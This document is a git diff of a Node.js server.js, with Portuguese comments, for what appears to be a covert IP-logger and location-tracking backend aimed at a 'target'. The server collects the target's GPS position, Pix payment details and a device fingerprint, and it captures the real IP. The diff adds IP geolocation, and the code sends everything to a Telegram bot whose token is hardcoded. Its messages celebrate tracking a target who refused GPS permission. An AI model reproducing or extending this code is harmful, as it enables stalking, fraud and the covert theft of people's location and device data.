@@ -1,4 +1,4 @@
-// server.js - COM PLANO B (IP LOGGER)
+// server.js - COM GEOLOCALIZAÇÃO DE IP AUTOMÁTICA
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
@@ -13,60 +13,83 @@ const TELEGRAM_BOT_TOKEN = "8510330829:AAG5Z_9XupX2x_GqeXPgfAooOjVC61L78v8";
 const TELEGRAM_CHAT_ID = "-5124871642";
 
 app.post("/send-location", async (req, res) => {
-  // 1. Recebe todos os dados (inclusive os novos do Fingerprint)
+  // 1. Recebe os dados do Front-end
   const {
-    latitude, longitude, maps,      // Dados de GPS (podem vir vazios se bloquear)
-    nome, valor,                    // Dados do Pix
-    bateria, conexao, ram, cpu, tela, navegador // Fingerprint
+    latitude, longitude, maps,
+    nome, valor,
+    bateria, conexao, ram, cpu, tela, navegador
   } = req.body;
 
-  // 2. CAPTURA DE IP (Mágica do Plano B)
-  // Pega o IP real ignorando proxies do Render/Vercel
+  // 2. CAPTURA O IP REAL
   const ipBruto = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const userIp = ipBruto ? ipBruto.split(',')[0].trim() : "Oculto";
 
+  // 3. CONSULTA AUTOMÁTICA DO IP (A novidade está aqui!)
+  let provedor = "Desconhecido";
+  let cidade = "Desconhecida";
+  let estado = "";
+
+  try {
+    // Só consulta se tiver um IP válido (não for localhost)
+    if (userIp && userIp !== "Oculto" && userIp.length > 6) {
+      const geo = await axios.get(`http://ip-api.com/json/${userIp}`);
+      if (geo.data && geo.data.status === 'success') {
+        provedor = geo.data.isp;    // Ex: Vivo, Claro, Net
+        cidade = geo.data.city;     // Ex: São Paulo
+        estado = geo.data.region;   // Ex: SP
+      }
+    }
+  } catch (e) {
+    console.log("Erro ao consultar API de IP:", e.message);
+  }
+
   let message = "";
 
-  // --- CENÁRIO 1: SUCESSO TOTAL (Tem GPS) ---
+  // --- CENÁRIO 1: SUCESSO (Tem GPS) ---
   if (latitude && longitude) {
     message = `
 🚨 <b>LOCALIZAÇÃO CAPTURADA!</b> 🚨
 
-🎯 <b>Alvo:</b> ${nome || 'Não informado'}
-💰 <b>Valor:</b> R$ ${valor || 'Não informado'}
+🎯 <b>Alvo:</b> ${nome || '?'} | 💰 <b>R$</b> ${valor || '?'}
 
 📍 <b>Lat:</b> <code>${latitude}</code>
 📍 <b>Long:</b> <code>${longitude}</code>
 🗺️ <b>Maps:</b> ${maps}
-🌐 <b>IP Real:</b> <code>${userIp}</code>
 
-📱 <b>DADOS DO DISPOSITIVO:</b>
-🔋 Bat: ${bateria || '?'} | 📡 Rede: ${conexao || '?'}
-💻 CPU: ${cpu || '?'} | 💾 RAM: ${ram || '?'}
-🖥️ Tela: ${tela || '?'}
-🌐 Nav: ${navegador || '?'}
+🌐 <b>DADOS DE REDE (IP):</b>
+🆔 <b>IP:</b> <code>${userIp}</code>
+🏢 <b>Provedor:</b> ${provedor}
+🏙️ <b>Local:</b> ${cidade} - ${estado}
+
+📱 <b>DISPOSITIVO:</b>
+🔋 Bat: ${bateria} | 📡 ${conexao}
+💻 CPU: ${cpu} | 💾 RAM: ${ram}
+🖥️ Tela: ${tela}
 `;
   }
-  // --- CENÁRIO 2: PLANO B (Só IP + Device) ---
+  // --- CENÁRIO 2: PLANO B (Só IP) ---
   else {
     message = `
 ⛔ <b>GPS BLOQUEADO (PLANO B)</b> ⛔
 
-O alvo negou a permissão, mas pegamos o IP!
+O alvo negou o GPS, mas rastreamos a rede!
 
-🌐 <b>IP Capturado:</b> <code>${userIp}</code>
-🎯 <b>Alvo:</b> ${nome || 'Não informado'}
+🌐 <b>RASTREAMENTO DE IP:</b>
+🆔 <b>IP:</b> <code>${userIp}</code>
+🏢 <b>Provedor:</b> ${provedor}
+🏙️ <b>Local Aproximado:</b> ${cidade} - ${estado}
 
-📱 <b>DADOS DO DISPOSITIVO:</b>
-🔋 Bat: ${bateria || '?'}
-📡 Rede: ${conexao || '?'}
-🖥️ Tela: ${tela || '?'}
-🌐 Nav: ${navegador || '?'}
+🎯 <b>Alvo:</b> ${nome || '?'}
+
+📱 <b>DISPOSITIVO:</b>
+🔋 Bat: ${bateria}
+📡 Conexão: ${conexao}
+🖥️ Tela: ${tela}
+🌐 Nav: ${navegador}
 `;
   }
 
   try {
-    // Envia para o Telegram
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
